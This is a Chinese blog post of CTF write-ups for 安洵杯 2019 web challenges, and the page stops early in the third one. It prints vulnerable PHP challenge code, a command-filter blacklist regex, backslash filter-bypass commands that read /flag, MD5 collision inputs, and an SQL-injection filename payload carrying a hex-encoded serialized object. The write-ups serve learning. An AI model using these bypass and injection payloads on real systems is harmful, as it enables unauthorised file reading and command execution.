<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  
  <title itemprop="name">安洵杯 | Pp1ove</title>
  
    <link rel="shortcut icon" href="/images/favicon.ico">
  
  <meta http-equiv="x-dns-prefetch-control" content="on">

  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
  <link rel="stylesheet" href="/css/lib.min.css" media="all">
  <link rel="stylesheet" href="/css/font.css" media="all">
  <link rel="stylesheet" href="/css/insight.css" media="all">
  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
  <link rel="stylesheet" href="/css/zoom.css" media="all">
  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
" type="text/css" media="all"> -->
  <script>
  /*Initial Variables*/
  var mashiro_option = new Object();
  var mashiro_global = new Object();
  mashiro_option.NProgressON = true;
  /* 
   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
   */
  mashiro_option.email_domain = "";
  mashiro_option.email_name = "";
  mashiro_option.cookie_version_control = "";
  mashiro_option.qzone_autocomplete = false;
  mashiro_option.site_name = "さくら荘そのPp1ove";
  mashiro_option.author_name = "Pp1ove";
  mashiro_option.site_url = "https://pp1ove.github.io/";
  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
  mashiro_option.mathjax = "0";
  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";

  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
  // mashiro_option.float_player_on = true;

  /*End of Initial Variables*/
  </script>

  <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn@latest/js/hititle.js"></script>
  <script type="text/javascript">
  var bg = "/img/cover/2.jpg,/img/cover/3.jpg,/img/cover/4.jpg,/img/cover/5.jpg,/img/cover/6.jpg,/img/cover/7.jpg,/img/cover/8.jpg,/img/cover/9.jpg,/img/cover/10.jpg".split(",");
  var bgindex = Math.floor(Math.random()*bg.length);
  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
    alert('朋友，IE浏览器未适配哦~');
  }
  </script>
  <style type="text/css">
  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
  </style>
  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}

  </style>

</head>
</html>

<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
  <div class="scrollbar" id="bar">
  </div>
  <a href="#" class="cd-top faa-float animated"></a>
  <section id="main-container">
    <div class="headertop filter-dot">
  <div id="banner_wave_1"></div>
  <div id="banner_wave_2"></div>
  <figure id="centerbg" class="centerbg">
    <div class="focusinfo no-select">
      <div class="header-tou">
        <a href="https://pp1ove.github.io/">
          <img src="/img/custom/head.jpg">
        </a>
      </div>
      <div class="header-info">
        <p>南风过境，十里春风不如你！</p>
        <div class="top-social_v2">
          <li id="bg-pre">
            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
          
            
              
                <li>
                  <a href="http://github.com/Pp1ove" target="_blank" class="social-github" title="github">
                    <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/social/github.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="https://space.bilibili.com/195675276" target="_blank" class="social-github" title="bilibili">
                    <img src="/img/social/bilibili.png">
                  </a>
                </li>
              
            
              
                <li class="wechat">
                  <a href="/#">
                    <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/social/wechat.png">
                  </a>
                  <div class="wechatInner">
                    <img src="/img/custom/wechat.jpg">
                  </div>
                </li>
              
            
              
                <li class="wechat">
                  <a href="/#">
                    <img src="/img/social/qq.png">
                  </a>
                  <div class="wechatInner">
                    <img src="/img/custom/qq.jpg">
                  </div>
                </li>
              
            
          
          <li id="bg-next">
            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
        </div>
      </div>
    </div>
  </figure>
  <div id="video-container" style="">
    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
    </video>
    <div id="video-btn" class="loadvideo videolive">
    </div>
    <div id="video-add">
    </div>
    <div class="video-stu">
    </div>
  </div>
  <div class="headertop-down faa-float animated" onclick="headertop_down()">
    <span>
      <i class="fa fa-chevron-down" aria-hidden="true">
      </i>
    </span>
  </div>
</div>
    <div id="page" class="site wrapper">
      <header class="site-header no-select gizle sabit" role="banner">
  <div class="site-top">
    <div class="site-branding">
      <span class="site-title">
        <span class="logolink moe-mashiro">
          <a href="/">
            <span class="sakurasono">さくら荘その</span>
            <span class="shironeko">Pp1ove</span>
          </a>
        </span>
      </span>
    </div>
    <div class="searchbox search-form-submit">
      <i class="iconfont js-toggle-search iconsearch icon-search">
      </i>
    </div>
    <div id="show-nav" class="showNav mobile-fit">
      <div class="line line1">
      </div>
      <div class="line line2">
      </div>
      <div class="line line3">
      </div>
    </div>
    <div class="lower-cantiner">
      <div class="lower">
        <nav class="mobile-fit-control hide">
          <ul id="menu-new" class="menu">
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
                    首页
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/archives">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
                    归档
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/categories/技术/">
                          <i class="fa fa-code" aria-hidden="true"></i>
                          技术
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/复现/">
                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
                          复现
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/学科/">
                          <i class="fa fa-commenting-o" aria-hidden="true"></i>
                          学科
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/题目/">
                          <i class="fa fa-book" aria-hidden="true"></i>
                          题目
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="javascript:;">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
                    清单
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/bangumi/">
                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
                          番组
                        </a>
                      </li>
                    
                      <li>
                        <a href="/music/">
                          <i class="fa fa-headphones" aria-hidden="true"></i>
                          歌单
                        </a>
                      </li>
                    
                      <li>
                        <a href="/tags/图集/">
                          <i class="fa fa-photo" aria-hidden="true"></i>
                          图集
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/comment/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
                    留言板
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/links/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
                    友人帐
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/donate/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
                    赞赏
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
                    关于
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/about/">
                          <i class="fa fa-meetup" aria-hidden="true"></i>
                          我？
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/client/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
                    客户端
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/atom.xml">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
                    RSS
                  </span>
                </a>
                
              </li>
            
          </ul>
        </nav>
      </div>
    </div>
  </div>
</header>

      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
<div class="pattern-center-blank"></div>

<div id="content" class="site-content">
  <div id="primary" class="content-area">
    <main id="main" class="site-main" role="main">
      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
        <div class="toc"></div>
        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
        
          <header class="entry-header">
            <h1 class="entry-title">安洵杯</h1>
            <p class="entry-census">Pp1ove&nbsp;·&nbsp;2021-2-20&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>

            <hr>
          </header>
        
        <div class="entry-content">
          <h1 id="安洵杯-2018"><a href="#安洵杯-2018" class="headerlink" title="[安洵杯 2018]"></a>[安洵杯 2018]</h1><h1 id="安洵杯-2019"><a href="#安洵杯-2019" class="headerlink" title="[安洵杯 2019]"></a>[安洵杯 2019]</h1><h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<p>可控img，获得源码</p>
<p>强类型比较绕过</p>
</blockquote>
<p><img src="/2021/02/20/安洵杯/image-20201206165852517.png" alt="image-20201206165852517"></p>
<h3 id="获取源码"><a href="#获取源码" class="headerlink" title="获取源码"></a>获取源码</h3><p>进去后查看源码等，都没有想要的东西，然后发现有两个参数，img和cmd，以为只是一个简单的命令执行，一直给cmd传参，发现返回一直错误，去网上找大佬们的wp，才知道这里疑似利用了一个ssrf漏洞，他利用img读取本地的文件，然后显示在左上角，我们可以控制img的参数，把它修改成我们需要读取的文件</p>
<p>这里首先要搞懂img参数的加密方式，本以为只是一个简单的base64加密，解密后发现并不是，</p>
<p>两次base64解码后得到：</p>
<p><img src="/2021/02/20/安洵杯/image-20201206170312258.png" alt="image-20201206170312258"></p>
<p>这里很明显是一个Hex加密，解密后为：555.png，</p>
<p>同理，当我们想要读取index.php文件时，先把index.php转换成16进制，再进行两次base64编码，得到index.php源码</p>
<p><img src="/2021/02/20/安洵杯/image-20201206170516845.png" alt="image-20201206170516845"></p>
<p>解码：</p>
<pre><code class="php">&lt;?php
error_reporting(E_ALL || ~ E_NOTICE);
header(&#39;content-type:text/html;charset=utf-8&#39;);
$cmd = $_GET[&#39;cmd&#39;];
if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;]))
    header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);
$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));

$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);
if (preg_match(&quot;/flag/i&quot;, $file)) {
    echo &#39;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#39;;
    die(&quot;xixi～ no flag&quot;);
} else {
    $txt = base64_encode(file_get_contents($file));
    echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;;
    echo &quot;&lt;br&gt;&quot;;
}
echo $cmd;
echo &quot;&lt;br&gt;&quot;;
if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) {
    echo(&quot;forbid ~&quot;);
    echo &quot;&lt;br&gt;&quot;;
} else {
    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) {
        echo `$cmd`;
    } else {
        echo (&quot;md5 is funny ~&quot;);
    }
}

?&gt;
&lt;html&gt;
&lt;style&gt;
    body{
        background:url(./bj.png)  no-repeat center center;
        background-size:cover;
        background-attachment:fixed;
        background-color:#CCCCCC;
    }
&lt;/style&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>分析一下这串代码，首先我们需要传进去一个cmd参数，然后正则匹配，cmd不能等于ls，cat等，但是我们可以使用ca\t,l\s等来执行命令，绕过后执行：</p>
<pre><code>if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) {
        echo \`$cmd\`;
    } else {
        echo (&quot;md5 is funny ~&quot;);
    }

</code></pre><p>这里是一个哈希比较缺陷，我所知道的只有数组绕过和常规的0e绕过，但试过之后发现都不行，这题用的是强类型碰撞,至于为什么前两种不行，我认为oe绕过不行是因为这里用的是===，而数组不行使因为数组没法转换为字符串，无法绕过<code>(string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;]</code> </p>
<h3 id="md5强类型碰撞"><a href="#md5强类型碰撞" class="headerlink" title="md5强类型碰撞"></a>md5强类型碰撞</h3><pre><code>$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;
$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;
</code></pre><pre><code>$data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;;
  $data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;;
</code></pre><pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
</code></pre><p>这里过滤了大部分命令执行的语句</p>
<pre><code>if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\
</code></pre><p>这里想到<br> <strong>linux命令中可以加\，所以甚至可以ca\t /fl\ag</strong><br> 查看当前目录有没有flag:<br> <img src="/2021/02/20/安洵杯/1625650-20200130214906057-780791704.png" alt="img"></p>
<p>并没有。。</p>
<p>去根目录下找flag：<br> <img src="/2021/02/20/安洵杯/1625650-20200130214914016-1979530748.png" alt="img"></p>
<p>发现flag，读取：</p>
<p>禁用cat之后，cmd=/bin/c\at%20/flag<br> <img src="/2021/02/20/安洵杯/1625650-20200130214921339-2060816534.png" alt="img"></p>
<p>看网上还有一种方法读取flag：</p>
<p>sort命令：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p>
<p><img src="/2021/02/20/安洵杯/1625650-20200130214928556-987685402.png" alt="img"><br> 参考链接<br> <a href="https://www.jianshu.com/p/21e3e1f74c08" target="_blank" rel="noopener">https://www.jianshu.com/p/21e3e1f74c08</a></p>
<pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
</code></pre><p>这里过滤了大部分命令执行的语句</p>
<pre><code>if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\
</code></pre><p>这里想到<br> <strong>linux命令中可以加\，所以甚至可以ca\t /fl\ag</strong><br> 查看当前目录有没有flag:<br> <img src="/2021/02/20/安洵杯/1625650-20200130214906057-780791704.png" alt="img"></p>
<p>并没有。。</p>
<p>去根目录下找flag：<br> <img src="/2021/02/20/安洵杯/1625650-20200130214914016-1979530748.png" alt="img"></p>
<p>发现flag，读取：</p>
<p>禁用cat之后，cmd=/bin/c\at%20/flag<br> <img src="/2021/02/20/安洵杯/1625650-20200130214921339-2060816534.png" alt="img"></p>
<p>看网上还有一种方法读取flag：</p>
<p>sort命令：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p>
<p><img src="/2021/02/20/安洵杯/1625650-20200130214928556-987685402.png" alt="img"></p>
<pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

</code></pre><p>​    得到flag<img src="/2021/02/20/安洵杯/image-20201206175647382.png" alt="image-20201206175647382"></p>
<h2 id="不是文件上传"><a href="#不是文件上传" class="headerlink" title="不是文件上传"></a>不是文件上传</h2><p>先试了下文件上传,发现好像真的没有问题,</p>
<p>然后在index.html最下方有提示，可以在github上下载源码进行审计。</p>
<p><img src="/2021/02/20/安洵杯/image-20210222190551800.png" alt="image-20210222190551800"></p>
<p>在helper.php中存在读取文件内容函数，并且可以使用destruct函数自动触发。</p>
<pre><code class="php">public function view_files($path){
        if ($this-&gt;ifview == False){
            return False;
            //The function is not yet perfect, it is not open yet.
        }
        $content = file_get_contents($path);
        echo $content;
    }

    function __destruct(){
        # Read some config html
        $this-&gt;view_files($this-&gt;config);
    }
</code></pre>
<p>如果可以构造如下的类并将序列化字符串传入，就可以读取到flag</p>
<pre><code class="php">&lt;?php
class helper {
    protected $ifview = True;
    protected $config = &quot;&quot;;
    public function __construct() {
      $this-&gt;config = &quot;flag&quot;;
    }
}
$a = new helper();
$b = serialize($a);
var_dump($b);
?&gt;
</code></pre>
<p>在show.php中存在反序列化函数，跟随变量<code>attr_temp</code>，看到此变量来源于数据库中<code>attr</code>列。</p>
<pre><code class="php">public function Get_All_Images(){
        $sql = &quot;SELECT * FROM images&quot;;
        $result = mysqli_query($this-&gt;con, $sql);
        if ($result-&gt;num_rows &gt; 0){
            while($row = $result-&gt;fetch_assoc()){
                if($row[&quot;attr&quot;]){
                    $attr_temp = str_replace(&#39;\0\0\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]);
                    $attr = unserialize($attr_temp);
                }
                echo &quot;&lt;p&gt;id=&quot;.$row[&quot;id&quot;].&quot; filename=&quot;.$row[&quot;filename&quot;].&quot; path=&quot;.$row[&quot;path&quot;].&quot;&lt;/p&gt;&quot;;
            }
        }else{
            echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;;
        }
        mysqli_close($this-&gt;con);
    }
</code></pre>
<p>在helper.php中的<code>upload</code>函数中我们得知数据库一共有<code>title</code>，<code>filename</code>，<code>ext</code>，<code>path</code>，<code>attr</code>五列，其中<code>attr</code>列内容来源于上传图像的长宽序列化数组，很难进行控制。</p>
<pre><code class="php">$array[&quot;title&quot;] = $fileinfo[&#39;title&#39;];
$array[&quot;filename&quot;] = $fileinfo[&#39;filename&#39;];
$array[&quot;ext&quot;] = $fileinfo[&#39;ext&#39;];
$array[&quot;path&quot;] = $fileinfo[&#39;path&#39;];
$img_ext = getimagesize($_FILES[$input][&quot;tmp_name&quot;]);
$my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);
$array[&quot;attr&quot;] = serialize($my_ext);
</code></pre>
<p>查看helper.php中的数据库操作函数，对输入数据库的数据没有做任何过滤。</p>
<pre><code class="php">foreach($data as $key=&gt;$value){
            $key_temp = str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0\0\0&#39;, $key);
            $value_temp = str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0\0\0&#39;, $value);
            $sql_fields[] = &quot;`&quot;.$key_temp.&quot;`&quot;;
            $sql_val[] = &quot;&#39;&quot;.$value_temp.&quot;&#39;&quot;;
        }
        $sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;
        mysqli_query($con, $sql);
</code></pre>
<p>回想前面的5列中，我们可控的且没有过滤的是<code>filename</code>列也就是文件名，可以构造文件名为序列化字符串，出发unserialize函数，读取任意文件。</p>
<pre><code class="php">title_value&#39;,&#39;filename_value&#39;,&#39;ext_value&#39;,&#39;path_value&#39;,&#39;O:6:&quot;helper&quot;:2:{s:9:&quot;*ifview&quot;;b:1;s:9:&quot;*config&quot;;s:4:&quot;flag&quot;;}#php
</code></pre>
<p>难题是在序列化中，所有的<code>private</code>和<code>protected</code>变量序列化之后都会出现不可见字符。将序列化的内容输出，使用<code>Hex Fiend</code>打开，可以看到在星号<code>*</code>两侧是存在不可见字符<code>00</code>的。直接复制输出的话是无法传入这两个字符的。在前面数据库插入操作的时候，将00*00转换为\0\0\0了，在反序列化之前又转换了回来。</p>
<p>由于上传时文件名不允许出现引号，配合数据库将0x开头的字符串默认为16进制的特点，最终payload为</p>
<pre><code class="sql">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4F3A363A2268656C706572223A323A7B733A393A22002A00696676696577223B623A313B733A393A22002A00636F6E666967223B733A353A222F666C6167223B7D)#.jpg
</code></pre>
<p>将实际插入数据库的语句改写为，完成注入，反序列化读取数据库中的恶意代码，访问show.php,完成文件读取。</p>
<pre><code class="sql">INSERT INTO images(&#39;title&#39;,&#39;filename&#39;,&#39;ext&#39;,&#39;path&#39;,&#39;attr&#39;) VALUES (&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4F3A363A2268656C706572223A323A7B733A393A22002A00696676696577223B623A313B733A393A22002A00636F6E666967223B733A353A222F666C6167223B7D)#)
</code></pre>
<h2 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h2><p>首先进去就可以看到源码</p>
<pre><code class="php"> &lt;?php

$function = @$_GET[&#39;f&#39;];

function filter($img){
    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;
    return preg_replace($filter,&#39;&#39;,$img);
}

if($_SESSION){
    unset($_SESSION);
}

$_SESSION[&quot;user&quot;] = &#39;guest&#39;;
$_SESSION[&#39;function&#39;] = $function;

extract($_POST);                            //extract变量覆盖

if(!$function){
    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;
}

if(!$_GET[&#39;img_path&#39;]){
    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
}else{
    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));  //sha1加密
}

$serialize_info = filter(serialize($_SESSION));

if($function == &#39;highlight_file&#39;){
    highlight_file(&#39;index.php&#39;);
}else if($function == &#39;phpinfo&#39;){
    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!
}else if($function == &#39;show_image&#39;){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));
} 
</code></pre>
<h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul>
<li>extract变量覆盖</li>
<li>反序列化字符串逃逸</li>
</ul>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>首先查看phpinfo发现php.ini中设置了auto_prepend_file隐式包含了d0g3_f1ag.php,本题就是要读取该文件</p>
<h4 id="0x01-extract变量覆盖"><a href="#0x01-extract变量覆盖" class="headerlink" title="0x01 extract变量覆盖"></a>0x01 extract变量覆盖</h4><p>extract()函数 该函数使用数组键名作为变量名，使用数组的键值作为变量值</p>
<p><img src="/2021/02/20/安洵杯/image-20210117150601750.png" alt="image-20210117150601750"></p>
